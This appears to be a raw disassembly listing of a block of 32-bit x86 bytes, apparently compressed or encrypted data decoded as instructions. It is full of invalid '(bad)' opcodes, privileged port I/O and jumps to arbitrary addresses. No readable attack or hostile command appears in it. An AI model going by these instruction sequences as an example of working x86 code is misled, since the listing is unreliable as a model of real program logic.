  42093b:	test   eax,0x65c8d689
  420940:	mov    eax,0x59bd7b55
  420945:	mov    edi,0x99c37768
  42094a:	lods   al,BYTE PTR ds:[esi]
  42094b:	pop    ss
  42094c:	add    al,0x14
  42094e:	(bad)  
  420950:	push   es
  420951:	test   DWORD PTR [edi+0x74863a4e],eax
  420957:	adc    BYTE PTR [esp+ecx*1],bl
  42095a:	mov    bl,0x1c
  42095c:	scas   eax,DWORD PTR es:[edi]
  42095d:	mov    WORD PTR [edx+ebp*2-0x402f388b],es
  420964:	cld    
  420965:	cdq    
  420966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420967:	es inc esi
  420969:	in     eax,0xc3
  42096b:	rcl    ebp,0xca
  42096e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42096f:	mov    cl,0x93
  420971:	mov    ds:0xfb93d314,al
  420976:	dec    eax
  420977:	sbb    ah,BYTE PTR [edi+0x36]
  42097a:	ret    
  42097b:	mov    bh,0xe9
  42097d:	cs and ecx,eax
  420980:	hlt    
  420981:	nop
  420982:	mov    ds:0xcca64cb1,eax
  420987:	xor    al,BYTE PTR [edx+0x27]
  42098a:	fcmovnu st,st(4)
  42098c:	jbe    0x420a05
  42098e:	mov    dl,bl
  420990:	inc    ebx
  420991:	pop    edi
  420992:	call   0x2cf9:0x62927782
  420999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42099a:	fld    DWORD PTR gs:[edi]
  42099d:	mov    ebp,0x56b9e21e
  4209a2:	inc    edx
  4209a3:	xor    al,0xa5
  4209a5:	(bad)  
  4209a6:	lods   eax,DWORD PTR ds:[esi]
  4209a7:	jmp    0x420a03
  4209a9:	fdivrp st(3),st
  4209ab:	out    0x78,eax
  4209ad:	xor    DWORD PTR [ebx+0x7da02157],0x923fea51
  4209b7:	ja     0x420a05
  4209b9:	adc    BYTE PTR [ecx-0x45],bh
  4209bc:	cmp    DWORD PTR [ebx+ecx*4],0xffffffe2
  4209c0:	xchg   esp,eax
  4209c1:	ins    DWORD PTR es:[edi],dx
  4209c2:	adc    edi,esi
  4209c4:	push   es
  4209c5:	es ja  0x42098d
  4209c8:	push   eax
  4209c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209ca:	test   bh,ah
  4209cc:	sar    DWORD PTR [ebx],1
  4209ce:	mov    ebx,0xac2807db
  4209d3:	xor    al,0x26
  4209d5:	dec    ecx
  4209d6:	push   ecx
  4209d7:	and    al,0x7c
  4209d9:	and    bh,BYTE PTR ds:0xc3ffc51a
  4209df:	ja     0x420a19
  4209e1:	cdq    
  4209e2:	cwde   
  4209e3:	and    eax,0x23b40bab
  4209e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209e9:	addr16 inc esi
  4209eb:	fdivr  DWORD PTR [edx+0x29c4620b]
  4209f1:	sbb    BYTE PTR [ebp+ebp*8-0x74b6fbf8],cl
  4209f8:	mov    bl,0x83
  4209fa:	adc    esp,DWORD PTR [ecx+0x2f]
  4209fd:	icebp  
  4209fe:	xchg   ecx,eax
  4209ff:	and    al,0xe1
  420a01:	scas   eax,DWORD PTR es:[edi]
  420a02:	stos   BYTE PTR es:[edi],al
  420a03:	hlt    
  420a04:	xchg   edi,eax
  420a05:	popa   
  420a06:	adc    eax,0xcd62197d
  420a0b:	sar    DWORD PTR [eax+0x3a625a9c],cl
  420a11:	jmp    0x420a83
  420a13:	jecxz  0x4209b1
  420a15:	out    0xa1,eax
  420a17:	inc    ecx
  420a18:	lock push 0xd802d9b0
  420a1e:	(bad)  
  420a1f:	and    edx,esi
  420a21:	hlt    
  420a22:	and    al,0x2a
  420a24:	idiv   DWORD PTR [ecx-0x51]
  420a27:	mov    bl,0xc9
  420a29:	or     eax,DWORD PTR [ecx-0x2c]
  420a2c:	hlt    
  420a2d:	inc    ebp
	...
  420a3a:	pop    es
  420a3b:	sbb    cl,BYTE PTR [ecx-0x686462e6]
  420a41:	pop    ds
  420a42:	(bad)  
  420a44:	std    
  420a45:	jg     0x420aae
  420a47:	mov    ecx,0x8700ddfc
  420a4c:	add    DWORD PTR [eax],eax
  420a4e:	cld    
  420a4f:	add    DWORD PTR [eax],eax
  420a51:	add    BYTE PTR [ecx+0x5b9ab958],ch
  420a57:	cmc    
  420a58:	inc    ebx
  420a59:	add    al,0x17
  420a5b:	aam    0x28
  420a5d:	mov    al,BYTE PTR [ebp+0x13d3cf1b]
  420a63:	test   BYTE PTR ds:0x9a506e48,bh
  420a69:	dec    esp
  420a6a:	inc    esi
  420a6b:	jp     0x420ad2
  420a6d:	mov    ch,0x38
  420a6f:	out    dx,al
  420a70:	adc    dh,BYTE PTR [eax+eiz*8]
  420a73:	in     al,0x39
  420a75:	nop
  420a76:	in     al,0x0
  420a78:	jmp    0x420a2d
  420a7a:	mov    esp,0xb199435a
  420a7f:	inc    eax
  420a80:	scas   eax,DWORD PTR es:[edi]
  420a81:	xchg   BYTE PTR [ebp+0x516c490f],ah
  420a87:	sbb    al,0x27
  420a89:	jo     0x420b04
  420a8b:	add    DWORD PTR [ebx-0x5c],edi
  420a8e:	pop    esp
  420a8f:	mov    bl,0xd9
  420a91:	inc    ebx
  420a92:	inc    eax
  420a93:	pop    eax
  420a94:	cli    
  420a95:	div    BYTE PTR [edi-0x66]
  420a98:	xor    BYTE PTR [eax],bh
  420a9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a9b:	pop    ebp
  420a9c:	sbb    DWORD PTR [ecx],esp
  420a9e:	xchg   esi,eax
  420a9f:	sub    bl,al
  420aa1:	es out 0x7b,al
  420aa4:	stc    
  420aa5:	stos   BYTE PTR es:[edi],al
  420aa6:	dec    ecx
  420aa7:	repnz repnz mov BYTE PTR [eax+0x3c],cl
  420aac:	add    BYTE PTR [ecx+0x57824087],dh
  420ab2:	sbb    DWORD PTR [edx+0x5c],0x6d
  420ab6:	sbb    BYTE PTR [ebx-0x69b3132f],0x5c
  420abd:	das    
  420abe:	out    0x8e,al
  420ac0:	jmp    0x420b37
  420ac2:	bound  ebp,QWORD PTR [esi]
  420ac4:	adc    al,0xbc
  420ac6:	or     DWORD PTR [ecx+0x37],0x15760ca5
  420acd:	js     0x420b20
  420acf:	inc    ebp
  420ad0:	xchg   esi,eax
  420ad1:	sub    BYTE PTR [ebx+ecx*2+0xd],bl
  420ad5:	dec    eax
  420ad6:	cdq    
  420ad7:	pop    ds
  420ad8:	in     eax,dx
  420ad9:	mov    ah,BYTE PTR [ebp+eiz*8+0xc]
  420add:	mov    edx,0xd38acc10
  420ae2:	or     al,0x97
  420ae4:	arpl   WORD PTR [ebx],dx
  420ae6:	jge    0x420b32
  420ae8:	das    
  420ae9:	rol    BYTE PTR [eax+0x7e8ea90b],0x6b
  420af0:	ins    BYTE PTR es:[edi],dx
  420af1:	pop    eax
  420af2:	xchg   ebx,eax
  420af3:	inc    ebx
  420af4:	pop    ecx
  420af5:	lods   al,BYTE PTR ds:[esi]
  420af6:	rcr    BYTE PTR [ebp-0x19],1
  420af9:	popf   
  420afa:	jne    0x420b73
  420afc:	xor    BYTE PTR [ebx-0x7e],ch
  420aff:	mov    eax,0xc525fc12
  420b04:	fst    DWORD PTR [esp+ebp*4]
  420b07:	mov    edx,0x94548f60
  420b0c:	fld    TBYTE PTR [ebx-0x80]
  420b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b10:	pop    ds
  420b11:	(bad)  
  420b12:	sahf   
  420b13:	cdq    
  420b14:	dec    edi
  420b15:	lahf   
  420b16:	je     0x420ad4
  420b18:	xor    al,0x43
  420b1a:	jnp    0x420abc
  420b1c:	jmp    0x420b03
  420b1e:	into   
  420b1f:	arpl   WORD PTR [ebp-0x75],bp
  420b22:	jecxz  0x420ad5
  420b24:	out    0xdd,al
  420b26:	call   0x39e0:0xc17ceeaf
  420b2d:	js     0x420b04
  420b2f:	xor    DWORD PTR [ecx-0x2f],edx
  420b32:	fisttp QWORD PTR fs:[ebp-0x38245c7c]
  420b39:	jo     0x420b80
  420b3b:	xor    ecx,DWORD PTR [ecx-0x1a]
  420b3e:	outs   dx,DWORD PTR ds:[esi]
  420b3f:	cmp    bl,BYTE PTR [eax]
  420b41:	inc    edi
  420b42:	lahf   
  420b43:	sahf   
  420b44:	test   DWORD PTR [eax+0x4b],eax
  420b47:	iret   
  420b48:	xchg   esp,ebx
  420b4a:	xchg   edi,eax
  420b4b:	cs stc 
  420b4d:	cwde   
  420b4e:	bound  ecx,QWORD PTR [esi-0x37]
  420b51:	(bad)  
  420b52:	dec    edi
  420b53:	pop    ecx
  420b54:	and    cl,al
  420b56:	loop   0x420af5
  420b58:	push   edx
  420b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b5a:	mov    ecx,DWORD PTR [ebx]
  420b5c:	loop   0x420b1d
  420b5e:	sub    al,0x25
  420b60:	mov    al,0xbe
  420b62:	jne    0x420b1d
  420b64:	lahf   
  420b65:	or     eax,0x9e543e3e
  420b6a:	dec    ebp
  420b6b:	inc    DWORD PTR [ecx+0x2a]
  420b6e:	daa    
  420b6f:	push   0xd1a4231d
  420b74:	cmp    esp,DWORD PTR [esp+esi*4-0x15]
  420b78:	and    BYTE PTR [ebx],bl
  420b7a:	xor    eax,0x894ac588
  420b7f:	jge    0x420b83
  420b81:	sar    bl,cl
  420b83:	mov    eax,ds:0xbcbc6293
  420b88:	rcl    DWORD PTR [eax-0x73],cl
  420b8b:	das    
  420b8c:	jmp    0x420b31
  420b8e:	dec    edi
  420b8f:	mov    dh,0xc9
  420b91:	dec    esi
  420b92:	add    cl,bh
  420b94:	inc    ebx
  420b95:	jge    0x420c08
  420b97:	dec    esi
  420b98:	stos   BYTE PTR es:[edi],al
  420b99:	lods   eax,DWORD PTR ds:[esi]
  420b9a:	out    0xda,eax
  420b9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b9d:	mov    esp,0x7306a121
  420ba2:	call   0x71a:0xa1e2622d
  420ba9:	mov    edi,0x475b1209
  420bae:	shld   DWORD PTR [edx],ecx,0xfd
  420bb2:	int3   
  420bb3:	push   edi
  420bb4:	aam    0x1
  420bb6:	fadd   QWORD PTR [edi-0x22667874]
  420bbc:	in     al,0x21
  420bbe:	jmp    0x420b7d
  420bc0:	push   eax
  420bc1:	out    0xf8,eax
  420bc3:	sub    DWORD PTR [edx-0x7ebbfa2c],edx
  420bc9:	push   es
  420bca:	int    0xfb
  420bcc:	popa   
  420bcd:	test   eax,0x8bf3ba37
  420bd2:	xor    dh,BYTE PTR [ebx]
  420bd4:	inc    esp
  420bd5:	sti    
  420bd6:	jmp    0x2337485d
  420bdb:	add    ecx,DWORD PTR [ebx+ecx*1]
  420bde:	daa    
  420bdf:	mov    edi,0x445ce0a6
  420be4:	mov    cl,BYTE PTR [edi-0x65]
  420be7:	add    eax,0xeb1a970f
  420bec:	xchg   esp,eax
  420bed:	adc    dh,BYTE PTR [eax]
  420bef:	fstp   DWORD PTR [ebx*8-0x7675b2a3]
  420bf6:	mov    ecx,0x796efabe
  420bfb:	sbb    DWORD PTR [ecx+0x64],eax
  420bfe:	nop
  420bff:	xchg   edx,eax
  420c00:	inc    DWORD PTR [ebp+0x3c]
  420c03:	out    0x82,eax
  420c05:	retf   
  420c06:	push   cs
  420c07:	aas    
  420c08:	cli    
  420c09:	lods   al,BYTE PTR ds:[esi]
  420c0a:	int3   
  420c0b:	push   edi
  420c0c:	call   0xf38673c1
  420c11:	jno    0x420c81
  420c13:	ins    DWORD PTR es:[edi],dx
  420c14:	and    ebp,esp
  420c16:	out    dx,eax
  420c17:	int    0xda
  420c19:	test   BYTE PTR [esi],al
  420c1b:	sub    eax,0xae7bd21d
  420c20:	mov    al,0x65
  420c22:	out    dx,eax
  420c23:	mov    bl,0xc2
  420c25:	mov    ss,WORD PTR fs:[edi-0x3ef8f1e0]
  420c2c:	dec    ecx
  420c2d:	in     eax,0xd0
  420c2f:	pop    esi
  420c30:	or     eax,0x47132def
  420c35:	inc    esi
  420c36:	jnp    0x420c3b
  420c38:	sahf   
  420c39:	jne    0x420be4
  420c3b:	loope  0x420caa
  420c3d:	push   eax
  420c3e:	add    ch,BYTE PTR [esi-0x3f19c96e]
  420c44:	pop    esi
  420c45:	rcl    DWORD PTR [ebx+ebp*2+0xa],cl
  420c49:	sahf   
  420c4a:	pop    edi
  420c4b:	adc    al,0xdc
  420c4d:	pop    eax
	...
  420c5a:	push   ds
  420c5b:	add    al,0xa7
  420c5d:	(bad)  
  420c5e:	mov    edi,0x7bdd7ee7
  420c63:	int    0x75
  420c65:	mov    WORD PTR [edx+0x17],ss
  420c68:	fcomp  QWORD PTR [ecx]
  420c6a:	cld    
  420c6b:	mov    BYTE PTR [ecx],al
  420c6d:	add    ah,bh
  420c6f:	add    DWORD PTR [eax],eax
  420c71:	add    BYTE PTR [eax-0x7c],ch
  420c74:	xchg   ebp,eax
  420c75:	mov    esp,0x66bef946
  420c7a:	jo     0x420c10
  420c7c:	(bad)  
  420c7e:	mov    ds,esp
  420c80:	hlt    
  420c81:	dec    edi
  420c82:	mov    esi,esi
  420c84:	mov    DWORD PTR [ecx+0x3e5e9126],edx
  420c8a:	dec    esi
  420c8b:	and    BYTE PTR [eax+0x6380db28],dl
  420c91:	dec    edi
  420c92:	jo     0x420cdd
  420c94:	mov    ds:0x8c3c899,eax
  420c99:	lea    ebp,[edi+0x30]
  420c9c:	push   esp
  420c9d:	and    BYTE PTR [ecx],bh
  420c9f:	jg     0x420c2c
  420ca1:	call   0x44dd872c
  420ca6:	mov    ebx,0x443a12c9
  420cab:	sbb    esp,0xa
  420cae:	mov    WORD PTR [esi-0x30699776],fs
  420cb4:	ret    0xa945
  420cb7:	mov    al,ds:0x31bc4ab0
  420cbc:	repz ret 
  420cbe:	mov    dl,0x26
  420cc0:	stos   DWORD PTR es:[edi],eax
  420cc1:	sbb    DWORD PTR [edi-0x36],edi
  420cc4:	sahf   
  420cc5:	mov    eax,0xc5113b9c
  420cca:	jecxz  0x420cad
  420ccc:	dec    ebx
  420ccd:	push   edi
  420cce:	not    BYTE PTR [eax-0x6800e60a]
  420cd4:	ret    
  420cd5:	mov    ecx,0x66e8f700
  420cda:	outs   dx,DWORD PTR ds:[esi]
  420cdb:	jecxz  0x420d5b
  420cdd:	jo     0x420d29
  420cdf:	pop    edx
  420ce0:	inc    edx
  420ce1:	mov    esi,DWORD PTR [ebx+0x34d3e09]
  420ce7:	push   esi
  420ce8:	pop    ecx
  420ce9:	xchg   ecx,eax
  420cea:	cld    
  420ceb:	mov    bl,0xa3
  420ced:	shl    ch,cl
  420cef:	out    0x39,al
  420cf1:	xchg   ebx,eax
  420cf2:	xchg   ebp,eax
  420cf3:	retf   
  420cf4:	cmp    ebp,eax
  420cf6:	or     BYTE PTR [ebp-0x65c746b4],0x94
  420cfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cfe:	and    DWORD PTR [edi],esp
  420d00:	fwait
  420d01:	mov    esp,0x9a857251
  420d06:	jnp    0x420d0d
  420d08:	lods   eax,DWORD PTR ds:[esi]
  420d09:	adc    ebx,DWORD PTR [eax+0x32c63d73]
  420d0f:	lods   al,BYTE PTR ds:[esi]
  420d10:	mov    ebx,DWORD PTR [ebx+0x73e83101]
  420d16:	xchg   DWORD PTR ss:[ebp+0x287ddeb9],ecx
  420d1d:	das    
  420d1e:	fwait
  420d1f:	mov    esi,DWORD PTR [ebx-0x18]
  420d22:	push   ebp
  420d23:	out    0x33,eax
  420d25:	xor    dh,BYTE PTR [esi-0x75]
  420d28:	and    DWORD PTR [eax+ecx*8-0x902c123],0x62
  420d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d31:	mov    cl,0x55
  420d33:	in     eax,0x6b
  420d35:	inc    edx
  420d36:	imul   edi,DWORD PTR [edx-0x175a36],0xc50dfb26
  420d40:	sbb    eax,DWORD PTR ds:0xd8463589
  420d46:	xor    BYTE PTR [edx],dh
  420d48:	jge    0x420cfc
  420d4a:	shr    DWORD PTR [edx+0x1b2a9036],0x59
  420d51:	xor    edx,DWORD PTR [edi]
  420d53:	stc    
  420d54:	jae    0x420d75
  420d56:	cmp    bh,BYTE PTR [edx+0x3c]
  420d59:	ror    dl,1
  420d5b:	lea    ecx,[ecx-0x6874716f]
  420d61:	mov    bh,0x2c
  420d63:	and    DWORD PTR [eax-0x63],ebp
  420d66:	lock bound edi,QWORD PTR [ebp*1-0x4964fda9]
  420d6e:	xchg   ebx,eax
  420d6f:	iret   
  420d70:	pop    es
  420d71:	xchg   esp,eax
  420d72:	sub    DWORD PTR [esi-0x61c7ba6b],edx
  420d78:	(bad)  
  420d79:	add    eax,0x1c080870
  420d7e:	(bad)  
  420d7f:	xchg   ebx,eax
  420d80:	mov    eax,ds:0xfec5f617
  420d85:	aad    0xc3
  420d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d88:	jmp    0x420d83
  420d8a:	pop    ebp
  420d8b:	ret    
  420d8c:	xor    BYTE PTR [ecx],0xd0
  420d8f:	sbb    BYTE PTR [edx-0x3f],bl
  420d92:	adc    DWORD PTR [esp+ecx*2+0x59],ecx
  420d96:	pushf  
  420d97:	popf   
  420d98:	test   dh,dl
  420d9a:	adc    esp,esp
  420d9c:	(bad)  
  420d9d:	cli    
  420d9e:	call   0x2813e2cb
  420da3:	xor    bl,bh
  420da5:	adc    DWORD PTR [eax-0xd1db7e7],ebp
  420dab:	ficom  WORD PTR [ecx-0x4e]
  420dae:	jb     0x420d41
  420db0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420db1:	cmc    
  420db2:	test   eax,0x996cd494
  420db7:	xchg   ebx,eax
  420db8:	jbe    0x420dd4
  420dba:	aad    0xac
  420dbc:	jb     0x420d43
  420dbe:	arpl   WORD PTR [ecx],di
  420dc0:	imul   edi,DWORD PTR [edx+0x916d321],0x98fa28e6
  420dca:	jmp    0xbe52:0xc48dbc75
  420dd1:	mov    ebp,DWORD PTR [ecx+0x10]
  420dd4:	loope  0x420d95
  420dd6:	(bad)  
  420dd8:	cmc    
  420dd9:	xchg   edx,eax
  420dda:	adc    DWORD PTR [ecx],0xffffffeb
  420ddd:	cwde   
  420dde:	add    eax,0x58cc92f
  420de3:	fld    DWORD PTR [eax+0x3e]
  420de6:	mov    ?,WORD PTR [ecx+0x5a]
  420de9:	sbb    esp,DWORD PTR es:[esi+0x8]
  420ded:	xchg   esp,eax
  420dee:	xchg   ebx,eax
  420def:	pop    edx
  420df0:	shl    BYTE PTR [ebp-0x51fd2239],0x4b
  420df7:	pop    ds
  420df8:	shl    DWORD PTR [ecx+0x35ba54ad],0xc4
  420dff:	mov    edx,0xda10f376
  420e04:	dec    ebp
  420e05:	xor    bh,BYTE PTR [ebp+0x3b]
  420e08:	test   BYTE PTR [eax+0x54e58c0e],ah
  420e0e:	daa    
  420e0f:	add    BYTE PTR [edx+0x19eb6273],dh
  420e15:	or     BYTE PTR [esi],ch
  420e17:	pop    es
  420e18:	push   ds
  420e19:	fcmovu st,st(0)
  420e1b:	ficom  WORD PTR [eax-0x13]
  420e1e:	sub    esp,DWORD PTR [edi]
  420e20:	mov    BYTE PTR [ebp-0x50ab09d1],cl
  420e26:	mov    eax,eax
  420e28:	ficom  DWORD PTR [eax+0x7677d5d]
  420e2e:	fidiv  WORD PTR ds:0x9dea7b59
  420e34:	lods   al,BYTE PTR ds:[esi]
  420e35:	push   cs
  420e36:	(bad)
  420e3a:	jo     0x420e6d
  420e3c:	rcl    BYTE PTR [edi+0x10],cl
  420e3f:	fcomp  DWORD PTR [esi+0x58]
  420e42:	xor    BYTE PTR [esi-0x63a5b433],bh
  420e48:	gs mov ecx,0xd5fe15b0
  420e4e:	retf   0xe633
  420e51:	pop    si
  420e53:	aam    0xee
  420e55:	inc    esi
  420e56:	call   0x1d3edfbe
  420e5b:	mov    ebx,0xada91574
  420e60:	mov    dh,0x5e
  420e62:	(bad)  
  420e63:	loope  0x420e3b
  420e65:	mov    ebp,0xbf3d2b44
  420e6a:	sub    al,0x56
  420e6c:	js     0x420ea6
	...
  420e7a:	js     0x420e05
  420e7c:	hlt    
  420e7d:	mov    al,0xf5
  420e7f:	std    
  420e80:	jl     0x420e4b
  420e82:	xor    dl,0x39
  420e85:	jg     0x420eff
  420e87:	std    
  420e88:	data16 (bad) 
  420e8a:	clc    
  420e8b:	mov    al,BYTE PTR [ecx]
  420e8d:	add    ah,bh
  420e8f:	add    DWORD PTR [eax],eax
  420e91:	add    BYTE PTR [esi-0x53],ah
  420e94:	cli    
  420e95:	pop    edi
  420e96:	(bad)  
  420e97:	sahf   
  420e98:	aad    0x6c
  420e9a:	mov    ds:0x6fe3f905,al
  420e9f:	xchg   ebp,eax
  420ea0:	add    al,0xe
  420ea2:	das    
  420ea3:	jmp    0x959eeb98
  420ea8:	push   eax
  420ea9:	jo     0x420ef9
  420eab:	xchg   esi,eax
  420eac:	mov    ebx,ebx
  420eae:	fisttp DWORD PTR [esi]
  420eb0:	cli    
  420eb1:	mov    ds:0xb7df9a43,al
  420eb6:	rcr    DWORD PTR [ebp+0x23],1
  420eb9:	or     eax,0x3a2ace1e
  420ebe:	jnp    0x420e73
  420ec0:	(bad)  
  420ec1:	stc    
  420ec2:	dec    ebp
  420ec3:	xchg   esi,eax
  420ec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ec5:	cwde   
  420ec6:	call   0x537f192b
  420ecb:	aam    0x7
  420ecd:	ins    DWORD PTR es:[edi],dx
  420ece:	loop   0x420f24
  420ed0:	jle    0x420ef8
  420ed2:	call   0xc207463f
  420ed7:	or     ah,BYTE PTR [ebx+0x5f2328e1]
  420edd:	push   esi
  420ede:	inc    esi
  420edf:	dec    ebx
  420ee0:	js     0x420f3d
  420ee2:	mov    bh,0xbc
  420ee4:	mov    edx,0x93b953f1
  420ee9:	pop    ds
  420eea:	cli    
  420eeb:	enter  0x6f06,0x9e
  420eef:	pop    ebp
  420ef0:	cld    
  420ef1:	scas   al,BYTE PTR es:[edi]
  420ef2:	cwde   
  420ef3:	stc    
  420ef4:	push   ds
  420ef5:	push   es
  420ef6:	push   edi
  420ef7:	pop    es
  420ef8:	and    dh,BYTE PTR [ecx-0x1f]
  420efb:	mov    ds:0xbba2500e,eax
  420f00:	retf   0x8b10
  420f03:	outs   dx,BYTE PTR ds:[esi]
  420f04:	jb     0x420f05
  420f06:	push   eax
  420f07:	dec    BYTE PTR ds:0x308f4845
  420f0d:	and    BYTE PTR ds:0xc61c1ccb,dh
  420f13:	xor    al,BYTE PTR ds:0x7ade3815
  420f19:	ins    DWORD PTR es:[edi],dx
  420f1a:	fs add bl,cl
  420f1d:	mov    ds:0x736529c6,eax
  420f22:	adc    cl,BYTE PTR [edi+0x6a]
  420f25:	jo     0x420f19
  420f27:	pop    es
  420f28:	and    al,0x5f
  420f2a:	ror    DWORD PTR [ecx],1
  420f2c:	jo     0x420eb2
  420f2e:	shr    BYTE PTR [esi-0x4acec521],1
  420f34:	jecxz  0x420f2b
  420f36:	jp     0x420f7c
  420f38:	out    dx,al
  420f39:	dec    ebx
  420f3a:	inc    eax
  420f3b:	xor    bh,al
  420f3d:	xor    DWORD PTR [eax],ecx
  420f3f:	inc    esp
  420f40:	addr16 inc eax
  420f42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f43:	ins    DWORD PTR es:[edi],dx
  420f44:	jp     0x420f95
  420f46:	shl    DWORD PTR [ebp+esi*1+0x21],cl
  420f4a:	retf   0xb7c9
  420f4d:	or     BYTE PTR [edi],cl
  420f4f:	and    ebp,DWORD PTR [ebx-0x58]
  420f52:	cmp    ebx,ebx
  420f54:	int3   
  420f55:	(bad)  
  420f56:	ds ja  0x420fb9
  420f59:	inc    eax
  420f5a:	stos   BYTE PTR es:[edi],al
  420f5b:	add    eax,0x28d32be4
  420f60:	pop    ebx
  420f61:	loop   0x420f4e
  420f63:	outs   dx,DWORD PTR ds:[esi]
  420f64:	push   eax
  420f65:	inc    ebp
  420f66:	ja     0x420f46
  420f68:	repz fadd QWORD PTR [ebx+0x8f38d01]
  420f6f:	inc    eax
  420f70:	repz push edi
  420f72:	jnp    0x420fce
  420f74:	jo     0x420f36
  420f76:	mov    ah,0xfa
  420f78:	cmp    al,0xc
  420f7a:	fs ret 0x1571
  420f7e:	and    dl,BYTE PTR [ebx-0x3b]
  420f81:	fst    QWORD PTR [esi]
  420f83:	mov    esp,0x1b4e3eb2
  420f88:	lds    edi,FWORD PTR [ebx+0x125ec2dd]
  420f8e:	int3   
  420f8f:	pusha  
  420f90:	imul   ebp,DWORD PTR [ebx+0x4],0x7343521e
  420f97:	inc    edi
  420f98:	mov    BYTE PTR [eax-0x7f],0x6b
  420f9c:	sbb    BYTE PTR [esi-0x827da32],0xa3
  420fa3:	aam    0x8e
  420fa5:	xrelease mov DWORD PTR [ecx+0x2c],0x8c4cb956
  420fad:	pusha  
  420fae:	adc    DWORD PTR [esi+0x5f20a6d7],esp
  420fb4:	cmp    BYTE PTR [eax],bl
  420fb6:	push   0xa99cd95b
  420fbb:	adc    edx,ecx
  420fbd:	jle    0x420f6a
  420fbf:	jmp    0x421034
  420fc1:	or     DWORD PTR [edx],ebp
  420fc3:	jg     0x420f58
  420fc5:	dec    eax
  420fc6:	cmp    eax,0x866c2e55
  420fcb:	mov    bh,0x18
  420fcd:	test   eax,0xe812bb6b
  420fd2:	mov    dh,0x3d
  420fd4:	int3   
  420fd5:	pop    edi
  420fd6:	xchg   BYTE PTR [edx-0x5d],dh
  420fd9:	mov    ebx,DWORD PTR [edx+0x7b]
  420fdc:	mov    ebp,ebp
  420fde:	sti    
  420fdf:	mov    ecx,0x7c5e3b9
  420fe4:	mov    ebx,0x83f5d7ef
  420fe9:	adc    BYTE PTR ds:0x2c40a25c,al
  420fef:	cld    
  420ff0:	dec    ebp
  420ff1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ff2:	or     DWORD PTR [esi+0x156d0a],ebx
  420ff8:	xor    al,0x2a
  420ffa:	push   0xfc05e69
  420fff:	ins    DWORD PTR es:[edi],dx
  421000:	jge    0x420f89
  421002:	clc    
  421003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421004:	xchg   DWORD PTR ds:0x97f40f9d,esp
  42100a:	or     DWORD PTR [esi+0x4a3303f3],ecx
  421010:	pop    ebp
  421011:	pop    ds
  421012:	or     al,0x35
  421015:	xor    edx,DWORD PTR [si+0x15cb]
  42101a:	jns    0x420fba
  42101c:	push   cs
  42101d:	fsub   st(4),st
  42101f:	xchg   edx,eax
  421020:	test   al,0xf2
  421022:	call   DWORD PTR [edx-0x265307f1]
  421028:	xor    eax,0x6f67ad0a
  42102d:	iret   
  42102e:	mov    es,WORD PTR [eax]
  421030:	pop    eax
  421031:	cdq    
  421032:	xchg   esp,eax
  421033:	shl    BYTE PTR [edi+0x6258dc49],cl
  421039:	dec    edi
  42103a:	jae    0x420fd8
  42103c:	lds    edx,FWORD PTR [eax+ebp*2+0xc6116b3]
  421043:	int3   
  421044:	xchg   edx,eax
  421045:	das    
  421046:	repz les esi,FWORD PTR [edi]
  421049:	adc    eax,0x658dbbd1
  42104e:	pause  
  421050:	add    dh,bh
  421052:	ret    0x7920
  421055:	aas    
  421056:	in     eax,dx
  421057:	cmp    edi,0xffffff86
  42105a:	les    esi,FWORD PTR [ebp-0x1262483]
  421060:	push   esi
  421061:	and    al,0x66
  421063:	xchg   edi,eax
  421064:	and    al,0xf2
  421066:	jbe    0x421040
  421068:	jmp    0xbb58b099
  42106d:	jmp    0x68e3731f
  421072:	cmp    eax,0x6676278c
  421077:	mov    bh,0xe8
  421079:	mov    edx,0xf6eda0ec
  42107e:	and    al,0xb3
  421080:	inc    ebp
  421081:	lods   eax,DWORD PTR ds:[esi]
  421082:	mov    esi,0xe5d05130
  421087:	fdivp  st(4),st
  421089:	and    BYTE PTR [eax+ebp*4],dh
  42108c:	fs inc ebp
	...
  42109a:	pop    esp
  42109b:	mov    dh,BYTE PTR [edi-0x23800895]
  4210a1:	mov    edi,0x2b60ebfc
  4210a6:	int3   
  4210a7:	dec    edx
  4210a8:	addr16 inc edx
  4210aa:	hlt    
  4210ab:	mov    WORD PTR [ecx],es
  4210ad:	add    ah,bh
  4210af:	add    DWORD PTR [eax],eax
  4210b1:	add    BYTE PTR [ecx],ah
  4210b3:	xchg   DWORD PTR [edx+0x1],edi
  4210b6:	adc    DWORD PTR [edx+0x28],ebx
  4210b9:	mov    WORD PTR [edx+esi*8+0x7e],gs
  4210bd:	cmp    al,0x7e
  4210bf:	jo     0x4210f5
  4210c1:	jmp    0x4210ce
  4210c3:	add    DWORD PTR [ebp+0x23],0x7f
  4210c7:	xor    BYTE PTR [ebx+0x7],dl
  4210ca:	mov    ds:0x9c16db11,eax
  4210cf:	(bad)  
  4210d0:	sar    BYTE PTR [ecx+edx*4+0x20275f4f],cl
  4210d7:	mov    eax,0xe6585a7d
  4210dc:	dec    edx
  4210dd:	jecxz  0x4210f6
  4210df:	std    
  4210e0:	xchg   BYTE PTR [ebx],bh
  4210e2:	popa   
  4210e3:	pusha  
  4210e4:	aaa    
  4210e5:	or     al,0x38
  4210e7:	jae    0x421157
  4210e9:	pop    esi
  4210ea:	jb     0x421080
  4210ec:	out    dx,al
  4210ed:	inc    edi
  4210ee:	mov    bl,0x80
  4210f0:	fadd   QWORD PTR [esi]
  4210f2:	ds scas al,BYTE PTR es:[edi]
  4210f4:	faddp  st(6),st
  4210f6:	jnp    0x421145
  4210f8:	push   es
  4210f9:	pop    edi
  4210fa:	and    al,BYTE PTR [eax]
